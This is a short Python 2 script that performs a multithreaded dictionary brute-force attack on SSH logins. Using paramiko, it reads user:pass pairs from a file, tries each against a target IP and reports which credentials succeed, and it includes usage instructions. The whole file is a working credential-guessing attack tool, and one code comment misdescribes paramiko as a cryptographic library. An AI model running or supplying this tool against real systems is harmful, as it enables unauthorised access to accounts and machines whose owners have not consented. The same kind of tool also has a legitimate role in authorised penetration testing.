#!/usr/bin/env python
# Paramiko is a cryptographic library
import paramiko, sys, time, threading

if len(sys.argv) < 3:
	# Checks how the command is written, if not so, then show 
	# the usage.
    print "Usage: %s IP /path/to/dictionary" % (str(sys.argv[0]))
    print "Example: %s 127.0.0.1 dict.txt" % (str(sys.argv[0]))
    print "Dictionary should be in user:pass format"
    sys.exit(1)

ip=sys.argv[1]; filename=sys.argv[2]

# Open the password file with the usernames
fd = open(filename, "r")

# Function to attempt to crack the password using 
# the brute-force algorithm
def attempt(IP,UserName,Password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(IP, username=UserName, password=Password)
    except paramiko.AuthenticationException:
        print '[-] %s:%s fail!' % (UserName, Password)
    else:
        print '[!] %s:%s is CORRECT!' % (UserName, Password)
    ssh.close()
    return
    
print '[+] Brute-forcing against %s with dictionary %s' % (ip, filename)
for line in fd.readlines():
    username, password = line.strip().split(":")
    t = threading.Thread(target=attempt, args=(ip,username,password))
    t.start()
    time.sleep(0.3)
    
# Closes the file and exits the program
fd.close()
sys.exit(0)
